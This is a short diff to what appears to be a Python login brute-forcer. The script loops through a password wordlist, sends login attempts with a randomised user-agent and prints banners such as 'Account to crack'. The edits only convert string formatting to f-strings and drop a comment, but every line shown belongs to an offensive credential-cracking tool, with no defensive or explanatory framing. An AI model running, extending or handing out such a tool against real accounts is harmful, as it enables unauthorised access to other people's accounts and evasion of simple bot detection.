@@ -32,7 +32,7 @@ def main():
 	print("Password does not exist in the wordlist")
 
 def brute(password):
-	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
+	sys.stdout.write(f"\r[*] Trying ..... {password}\n")
 	sys.stdout.flush()
 	br.addheaders = [('User-agent', random.choice(useragents))]
 	site = br.open(login)
@@ -54,8 +54,6 @@ def search():
 		password = password.replace("\n","")
 		brute(password)
 
-
-#welcome
 def welcome():
 	wel = """
 
@@ -72,7 +70,7 @@ def welcome():
 	total = open(passwordlist,"r")
 	total = total.readlines()
 	print(wel)
-	print(" [*] Account to crack : {}".format(email))
+	print(f" [*] Account to crack : {email}")
 	print(" [*] Loaded :" , len(total), "passwords")
 	print(" [*] Cracking, please wait ...\n\n")
 
